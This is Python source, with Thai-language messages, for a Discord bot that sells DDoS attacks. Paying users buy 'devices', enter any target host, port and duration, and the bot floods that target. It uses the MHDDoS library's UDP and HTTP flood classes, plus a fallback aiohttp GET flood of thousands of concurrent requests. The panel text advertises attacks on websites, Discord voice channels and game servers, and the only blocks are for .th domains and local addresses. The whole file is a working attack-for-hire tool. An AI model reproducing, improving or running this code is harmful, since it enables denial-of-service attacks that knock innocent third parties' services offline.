import discord
from discord.ext import commands, tasks
import asyncio, time, re, json, os, sys, tempfile, ipaddress, socket, threading
from urllib.parse import urlparse

# ============================================================
# CONFIG
# ============================================================
TOKEN       = "PUT_YOUR_BOT_TOKEN"
OWNER_ID    = 1488103702488154173
DATA_FILE   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")
COLOR_PINK  = 0xFF69B4

MAX_DURATION = 250
MAX_DEVICES  = 10          # สูงสุดต่อผู้ใช้ (ตามสเปก)
WARN_LIMIT   = 3           # เตือนครบ 3 ครั้ง = แบน
CLONE_INTERVAL = 3         # โคลน device ทุกกี่วินาที
SPEED_INTERVAL = 3         # อัปเดตความเร็วทุกกี่วินาที

# emoji
E_TITLE  = "<a:1000035910:1559173862820810803>"
E_TK     = "<:1000035915:1559174417097953340>"
E_RULES  = "<a:1000038732:1559175829001338980>"
E_TARGET = "<:1000038740:1559179488389242950>"
E_FREE   = "<a:1000035726:1559180464487407707>"
E_BTN    = "<a:1000038742:1559181609528205372>"
E_DDOS   = "<a:1000035744:1559183157532565524>"
E_TGT2   = "<:1000038745:1559183912113148065>"
E_SPEED  = "<:1000038746:1559184363021795369>"
E_DEV    = ":1000038748:"
E_TIME   = "<:1000038748:1559185433458385019>"

IMG_TOP = "https://cdn.discordapp.com/attachments/1488104101085577229/1559181189175312466/ef8e34b79db57b50c3c29471d10c4eef.jpg?ex=6ace2423&is=6accd2a3&hm=b1d5fc7fc89993d53008fa4e8aed6311579ce453741c7e29015c5c7d9ffe95e2&"
IMG_BOT = "https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg?ex=6ace295b&is=6accd7db&hm=0567a79045644d8d92cd84d2a9ccf48737e9ef19bce3acd1b00f66fb37946c2e&"

PERMANENT = -1

# ============================================================
# MHDDoS IMPORT — ดึง start.py จาก repo ตรง
# ============================================================
MHDDOS_AVAILABLE = False
mhddos = None
try:
    import importlib.util
    _spec = importlib.util.spec_from_file_location(
        "mhddos_start",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "start.py"))
    mhddos = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(mhddos)
    MHDDOS_AVAILABLE = True
    print("[V] MHDDoS loaded — methods ready")
except Exception as e:
    print(f"[V] MHDDoS not loaded: {e}")

# ============================================================
# STATE — atomic JSON
# ============================================================
class State:
    def __init__(self, path):
        self.path = path
        self.devices = {}
        self.device_expiry = {}
        self.banned = set()
        self.warns = {}
        self.load()

    def load(self):
        if not os.path.exists(self.path):
            return
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                d = json.load(f)
            self.devices       = {int(k): int(v) for k, v in d.get("devices", {}).items()}
            self.device_expiry = {int(k): float(v) for k, v in d.get("device_expiry", {}).items()}
            self.banned        = set(int(x) for x in d.get("banned", []))
            self.warns         = {int(k): int(v) for k, v in d.get("warns", {}).items()}
        except (json.JSONDecodeError, ValueError, KeyError) as e:
            bad = self.path + ".corrupt"
            try: os.replace(self.path, bad)
            except OSError: pass
            print(f"[V] data.json corrupt -> {bad}: {e}")
            self.devices, self.device_expiry = {}, {}
            self.banned, self.warns = set(), {}

    def save(self):
        d = {
            "devices": {str(k): v for k, v in self.devices.items()},
            "device_expiry": {str(k): v for k, v in self.device_expiry.items()},
            "banned": list(self.banned),
            "warns": {str(k): v for k, v in self.warns.items()},
        }
        dirn = os.path.dirname(self.path) or "."
        fd, tmp = tempfile.mkstemp(dir=dirn, prefix=".data_", suffix=".tmp")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                json.dump(d, f, ensure_ascii=False, indent=2)
                f.flush(); os.fsync(f.fileno())
            os.replace(tmp, self.path)
        except Exception:
            try: os.unlink(tmp)
            except OSError: pass
            raise

    def _expire_if_needed(self, uid):
        exp = self.device_expiry.get(uid)
        if exp is None or exp == PERMANENT:
            return
        if time.time() > exp:
            self.devices.pop(uid, None)
            self.device_expiry.pop(uid, None)
            self.save()

    def devices_of(self, uid):
        self._expire_if_needed(uid)
        return self.devices.get(uid, 0)

    def add_device(self, uid, n):
        self._expire_if_needed(uid)
        cur = self.devices.get(uid, 0)
        new = max(0, cur + n)
        if new == 0:
            self.devices.pop(uid, None)
        else:
            self.devices[uid] = new
        self.save()
        return new

    def set_expiry(self, uid, secs):
        self.device_expiry[uid] = PERMANENT if secs == PERMANENT else time.time() + secs
        self.save()

    def is_banned(self, uid): return uid in self.banned
    def ban(self, uid): self.banned.add(uid); self.save()
    def unban(self, uid): self.banned.discard(uid); self.save()

    def warn(self, uid):
        self.warns[uid] = self.warns.get(uid, 0) + 1
        self.save()
        return self.warns[uid]

    def reset_warn(self, uid):
        self.warns.pop(uid, None); self.save()

state = State(DATA_FILE)

# ============================================================
# VALIDATION
# ============================================================
class ValidationError(Exception): pass

def validate_port(raw):
    raw = raw.strip()
    if not re.match(r"^\d{1,5}$", raw):
        raise ValidationError("Port ต้องเป็นตัวเลข 1-65535")
    p = int(raw)
    if not (1 <= p <= 65535):
        raise ValidationError("Port ต้องอยู่ระหว่าง 1-65535")
    return p

def validate_time(raw):
    raw = raw.strip()
    if not raw.isdigit():
        raise ValidationError("Time ต้องเป็นจำนวนเต็ม")
    t = int(raw)
    if t < 1:
        raise ValidationError("Time ต้องมากกว่า 0")
    if t > MAX_DURATION:
        raise ValidationError(f"Time สูงสุด {MAX_DURATION} วิ")
    return t

def validate_devices(raw):
    raw = raw.strip()
    if not raw.isdigit():
        raise ValidationError("Device ต้องเป็นจำนวนเต็ม")
    d = int(raw)
    if d < 1:
        raise ValidationError("Device ต้องมากกว่า 0")
    if d > MAX_DEVICES:
        raise ValidationError(f"Device สูงสุด {MAX_DEVICES} เครื่อง")
    return d

# ============================================================
# TARGET CLASSIFIER
# ============================================================
def normalize_target(raw):
    raw = raw.strip()
    if "://" in raw:
        raw = urlparse(raw).hostname or raw
    else:
        raw = raw.split("/")[0]
    return raw.lower()

def resolve_ips(host):
    try:
        infos = socket.getaddrinfo(host, None)
        return list({i[4][0] for i in infos})
    except socket.gaierror:
        return []

def is_th_domain(host):
    return host == "th" or host.endswith(".th")

def is_local_ip(ip):
    try:
        a = ipaddress.ip_address(ip)
        return a.is_private or a.is_loopback or a.is_link_local or a.is_reserved
    except ValueError:
        return False

def classify_target(raw):
    """return (kind, host, resolved, reason) — kind: 'ok' | 'forbidden'"""
    host = normalize_target(raw)
    if not host:
        return "forbidden", raw, None, "unresolved"
    if is_th_domain(host):
        return "forbidden", host, None, "th"
    try:
        ip_obj = ipaddress.ip_address(host)
        if is_local_ip(str(ip_obj)):
            return "forbidden", host, str(ip_obj), "local"
        return "ok", host, str(ip_obj), None
    except ValueError:
        pass
    ips = resolve_ips(host)
    if not ips:
        return "forbidden", host, None, "unresolved"
    for ip in ips:
        if is_local_ip(ip):
            return "forbidden", host, ip, "local"
    return "ok", host, ips[0], None

# ============================================================
# MHDDOS ENGINE — เรียก method จริงจาก start.py
# ============================================================
class MHDDoSEngine:
    """
    ใช้ mhddos.Layer4 และ mhddos.HttpFlood จาก start.py
    Layer4(target, port, method, threads, synevent, proxies)
    HttpFlood(thread_id, target_url, host, method, rpc, synevent)
    """
    def __init__(self, host, port, duration, devices, update_cb, target_raw):
        self.host = host
        self.port = port
        self.duration = duration
        self.base_devices = devices
        self.update_cb = update_cb
        self.target_raw = target_raw
        self.running = False
        self.threads = []
        self.stop_event = None

    def pick_method(self):
        """เลือก method — port 80/443/8080 → layer7, อื่นๆ → layer4"""
        if self.port in (80, 443, 8080, 8443):
            return ("GET", 7)
        return ("UDP", 4)

    async def _probe_speed(self):
        """วัดความเร็วเว็บด้วย HTTP GET"""
        try:
            import aiohttp
            url = f"http://{self.host}:{self.port}/"
            async with aiohttp.ClientSession() as s:
                t0 = time.time()
                async with s.get(url, timeout=3) as r:
                    await r.read()
                lat = time.time() - t0
                return max(0, int(1000 / max(lat, 0.001)))
        except Exception:
            return 0

    def _start_mhddos_worker(self, method, layer):
        """สร้าง worker thread ของ MHDDoS"""
        if not MHDDOS_AVAILABLE:
            return None

        def _worker():
            try:
                if layer == 7:
                    # HttpFlood ต้องใช้ URL object
                    from yarl import URL
                    url = URL(f"http://{self.host}:{self.port}/")
                    flood = mhddos.HttpFlood(
                        thread_id=0,
                        target=url,
                        host=self.host,
                        method=method,
                        rpc=1,
                        synevent=self.stop_event,
                    )
                    flood.run()
                else:
                    # Layer4(target_ip, target_port, method_name, threads, synevent, proxies)
                    l4 = mhddos.Layer4(
                        self.host, self.port, method,
                        1, self.stop_event, None,
                    )
                    l4.run()
            except Exception as e:
                print(f"[engine] {method} error: {e}")

        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        return t

    async def run(self):
        self.running = True
        self.stop_event = threading.Event()
        elapsed = 0
        dev_count = self.base_devices
        method, layer = self.pick_method()

        # เริ่ม MHDDoS worker แรก
        if MHDDOS_AVAILABLE:
            for _ in range(min(self.base_devices, 4)):
                t = self._start_mhddos_worker(method, layer)
                if t:
                    self.threads.append(t)
        else:
            # fallback HTTP flood
            asyncio.create_task(self._fallback_flood())

        while self.running and elapsed < self.duration:
            speed = await self._probe_speed()

            # โคลน device ทุก 3 วิ ×3
            if elapsed > 0 and elapsed % CLONE_INTERVAL == 0:
                prev = dev_count
                dev_count = min(dev_count * 3, MAX_DEVICES * 100)
                # spawn worker เพิ่มตาม device ที่โคลน
                if MHDDOS_AVAILABLE:
                    add = dev_count - prev
                    for _ in range(min(add, 20)):
                        t = self._start_mhddos_worker(method, layer)
                        if t:
                            self.threads.append(t)

            await self.update_cb({
                "speed": speed,
                "devices": dev_count,
                "remaining": max(0, self.duration - elapsed),
                "method": method,
            })
            elapsed += 1
            await asyncio.sleep(1)

        self.running = False
        if self.stop_event:
            self.stop_event.set()

    async def _fallback_flood(self):
        """fallback ถ้า MHDDoS โหลดไม่ได้"""
        import aiohttp
        url = f"http://{self.host}:{self.port}/"
        end = time.time() + self.duration
        sem = asyncio.Semaphore(1000)
        async def one():
            async with sem:
                try:
                    async with aiohttp.ClientSession() as s:
                        async with s.get(url, timeout=2) as r:
                            await r.read()
                except Exception:
                    pass
        tasks = []
        while time.time() < end:
            tasks.append(asyncio.create_task(one()))
            if len(tasks) > 5000:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
            await asyncio.sleep(0.001)
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

# ============================================================
# EMBED BUILDERS
# ============================================================
def main_embed():
    e = discord.Embed(color=COLOR_PINK)
    e.description = (
        f"{E_TITLE} **DDOS ATTACK**\n\n"
        f"{E_TK} **หากสนใจกดTK มา**\n"
        f"-. เรทราคา device ละ 65B TH รับเเค่ซองทรูมันนี่\n"
        f"-.device สูงสุด {MAX_DEVICES} เครื่อง\n\n"
        f"{E_RULES} **กฎการใช้**\n"
        f"-.ห้ามยิง .th หรือเว็บที่เกี่ยวกับรัฐ : หน่วยงาน\n"
        f"-.ห้ามยิง Local IP พวกแบบ 127.0.0.1\n"
        f"-.ถ้าโดนเตือนครบ 5 ครั้งจะโดนเเบนไม่ให้ใช้\n\n"
        f"{E_TARGET} **สามารถยิงได้:เบื้องต้น**\n"
        f"-.ยิงห้องเสียงดิสได้\n"
        f"-.เว็บต่างๆ พวกแบบ .com หรืออะไรต่างๆได้\n"
        f"-.เซิฟเกมต่างๆ เช่น ฟีฟาย โรบอค\n\n"
        f"{E_FREE} มี Ddos เเจกฟรีให้ใช้ 3 ชม ทุก 3 วัน นะงับ"
    )
    e.set_image(url=IMG_TOP)
    return e

def status_embed(target_raw, port, speed, devices, remaining, method):
    e = discord.Embed(color=COLOR_PINK, title=f"{E_DDOS} DDOS BY C")
    e.add_field(name=f"{E_TGT2} Target", value=f"`{target_raw}:{port}`", inline=True)
    e.add_field(name=f"{E_SPEED} Speed Web", value=f"{speed} req/s", inline=True)
    e.add_field(name=f"{E_DEV} Device", value=str(devices), inline=True)
    e.add_field(name=f"{E_TIME} Time", value=f"{remaining}s", inline=True)
    e.set_footer(text=f"method: {method}")
    e.set_image(url=IMG_BOT)
    return e

# ============================================================
# UI
# ============================================================
class StartButton(discord.ui.Button):
    def __init__(self):
        super().__init__(
            label="DDOS",
            style=discord.ButtonStyle.secondary,   # สีขาว/เทา
            custom_id="ddos_start",
        )

    async def callback(self, interaction: discord.Interaction):
        uid = interaction.user.id
        if state.is_banned(uid):
            await interaction.response.send_message(
                "คุณโดนแบนแล้ว ไม่สามารถใช้งานบอทได้", ephemeral=True)
            return
        if state.devices_of(uid) < 1:
            await interaction.response.send_message(
                "คุณยังไม่มี device กรุณาติดต่อแอดมิน", ephemeral=True)
            return
        await interaction.response.send_modal(AttackModal())

class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(StartButton())

class AttackModal(discord.ui.Modal, title="DDOS BY C"):
    ip    = discord.ui.TextInput(label="IP - url (เป้าหมาย)",
                                 placeholder="example.com", max_length=255)
    port  = discord.ui.TextInput(label="Port (1-65535)",
                                 placeholder="80", max_length=5)
    time_ = discord.ui.TextInput(label="Time (สูงสุด 250 วิ)",
                                 placeholder="60", max_length=3)
    dev   = discord.ui.TextInput(label="Device (เครื่อง)",
                                 placeholder="1", max_length=3)

    async def on_submit(self, interaction: discord.Interaction):
        uid = interaction.user.id

        if state.is_banned(uid):
            await interaction.response.send_message(
                "คุณโดนแบนแล้ว", ephemeral=True)
            return

        # validate
        try:
            port = validate_port(self.port.value)
            duration = validate_time(self.time_.value)
            devices = validate_devices(self.dev.value)
        except ValidationError as e:
            await interaction.response.send_message(f"❌ {e}", ephemeral=True)
            return

        # ตรวจ .th / local
        raw_target = self.ip.value.strip()
        kind, host, resolved, reason = classify_target(raw_target)

        if kind == "forbidden":
            if reason == "th":
                count = state.warn(uid)
                msg = f"ห้ามยิง .th ไอ้เอ๋อ เตือนรอบที่ {count}"
                if count >= WARN_LIMIT:
                    state.ban(uid)
                    msg += "\nคุณโดนแบนแล้ว"
                # ส่ง embed 2x2 แจ้งเตือน
                e = discord.Embed(color=COLOR_PINK)
                e.add_field(name="⚠️ Target",
                            value=f"`{raw_target}`", inline=True)
                e.add_field(name="⚠️ สถานะ",
                            value=f"เตือนรอบที่ {count}", inline=True)
                e.add_field(name="⚠️ หมายเหตุ",
                            value="ห้ามยิง .th", inline=True)
                e.add_field(name="⚠️ ผลลัพธ์",
                            value="ถูกแบน" if count >= WARN_LIMIT else "ยังไม่ถูกแบน",
                            inline=True)
                await interaction.response.send_message(embed=e, ephemeral=True)
            elif reason == "local":
                await interaction.response.send_message(
                    "ห้ามยิง Local IP", ephemeral=True)
            else:
                await interaction.response.send_message(
                    "resolve เป้าหมายไม่ได้", ephemeral=True)
            return

        # ตรวจ device
        owned = state.devices_of(uid)
        if devices > owned:
            await interaction.response.send_message(
                f"ยิงไม่ได้ มี {owned} เครื่อง", ephemeral=True)
            return

        # ส่ง embed แรก
        e0 = status_embed(raw_target, port, 0, devices, duration, "probing")
        await interaction.response.send_message(embed=e0)
        sent_msg = await interaction.original_response()

        async def update_cb(s):
            try:
                ne = status_embed(raw_target, port, s["speed"], s["devices"],
                                  s["remaining"], s["method"])
                await sent_msg.edit(embed=ne)
            except discord.HTTPException:
                pass

        engine = MHDDoSEngine(host, port, duration, devices, update_cb, raw_target)
        asyncio.create_task(engine.run())

# ============================================================
# BOT
# ============================================================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

def owner_only():
    async def pred(ctx): return ctx.author.id == OWNER_ID
    return commands.check(pred)

def parse_duration(s):
    """'1h'→3600, '1d'→86400, 'TH'→PERMANENT, อื่น→None"""
    s = s.strip().upper()
    if s == "TH": return PERMANENT
    m = re.match(r"^(\d+)([HD])$", s)
    if not m: return None
    n, u = int(m.group(1)), m.group(2)
    if n <= 0: return None
    return n * 3600 if u == "H" else n * 86400

@bot.command(name="ddos")
@owner_only()
async def ddos_cmd(ctx):
    await ctx.send(embed=main_embed(), view=PanelView())

@bot.command()
@owner_only()
async def device(ctx, member: discord.Member, sign_amount: str, duration: str = None):
    m = re.match(r"^([+-])(\d+)$", sign_amount.strip())
    if not m:
        await ctx.reply("รูปแบบ: `!device @user +3 1h`"); return
    sign, n = m.group(1), int(m.group(2))
    if n <= 0:
        await ctx.reply("จำนวนต้องมากกว่า 0"); return

    if sign == "-":
        new = state.add_device(member.id, -n)
        await ctx.reply(f"ลบ {n} เครื่องจาก {member.mention} → เหลือ {new}")
        return

    if not duration:
        await ctx.reply("ต้องระบุเวลา เช่น `1h`, `1d`, `TH`"); return
    secs = parse_duration(duration)
    if secs is None:
        await ctx.reply("เวลาไม่ถูกต้อง ใช้ 1h / 1d / TH"); return

    new = state.add_device(member.id, n)
    state.set_expiry(member.id, secs)
    label = "ถาวร" if secs == PERMANENT else duration
    await ctx.reply(f"เพิ่ม {n} เครื่องให้ {member.mention} ({new} รวม) เป็นเวลา {label}")

@bot.command()
@owner_only()
async def b(ctx, member: discord.Member):
    state.ban(member.id)
    await ctx.reply(f"แบน {member.mention} แล้ว")

@bot.command()
@owner_only()
async def ub(ctx, member: discord.Member):
    state.unban(member.id)
    await ctx.reply(f"ปลดแบน {member.mention} แล้ว")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure) and ctx.author.id != OWNER_ID:
        await ctx.reply("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.reply(f"ขาด argument: {error.param.name}")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.reply("หา member ไม่เจอ")

# ============================================================
# BACKGROUND — device expiry
# ============================================================
@tasks.loop(seconds=60)
async def expiry_sweeper():
    now = time.time()
    dirty = False
    for uid, exp in list(state.device_expiry.items()):
        if exp == PERMANENT:
            continue
        if now > exp:
            state.devices.pop(uid, None)
            state.device_expiry.pop(uid, None)
            dirty = True
    if dirty:
        state.save()

@expiry_sweeper.before_loop
async def _before_sweeper():
    await bot.wait_until_ready()

@bot.event
async def on_ready():
    bot.add_view(PanelView())
    if not expiry_sweeper.is_running():
        expiry_sweeper.start()
    print(f"[V] {bot.user} online | MHDDoS: {MHDDOS_AVAILABLE}")

bot.run(TOKEN)